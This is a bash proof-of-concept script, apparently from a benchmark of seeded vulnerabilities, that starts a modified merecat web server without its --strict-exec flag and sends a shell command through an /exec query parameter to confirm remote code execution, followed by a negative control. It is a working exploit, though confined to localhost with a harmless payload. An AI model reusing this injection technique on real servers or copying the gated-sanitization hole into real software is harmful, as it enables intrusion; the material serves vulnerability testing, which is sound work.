#!/usr/bin/env bash
# PoC for 057_merecat_C1I3S3
# Axes: C1 (single CLI flag gate) / I3 (struct dispatch) / S3 (config-gated sanitization)
#
# Vulnerability: --strict-exec is omitted at startup, leaving the sanitization
# check inactive.  The command flows through an exec_args_t struct but without
# --strict-exec the struct's strict field is 0 and the check is skipped.
#
# Gate flag: --exec-mode
# Exploit: omit --strict-exec so the sanitization path is never entered.
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/merecat"
WWWROOT="/tmp/poc_057_www"
MARKER="/tmp/poc_057_marker"
PORT=18057

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server (omit --strict-exec to bypass S3 sanitization) ───────────────
echo "[*] starting merecat with --exec-mode (no --strict-exec) on port $PORT..."
"$BINARY" -n -p "$PORT" "$WWWROOT" --exec-mode &
SERVER_PID=$!
sleep 2

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>$MARKER (flows through exec_args_t struct)"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without --exec-mode ──────────────────────
echo "[*] verifying gate: endpoint must be absent without --exec-mode..."
NEG_PORT=$((19000 + 57))
"$BINARY" -n -p $NEG_PORT "$WWWROOT" &
SAFE_PID=$!
sleep 2
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
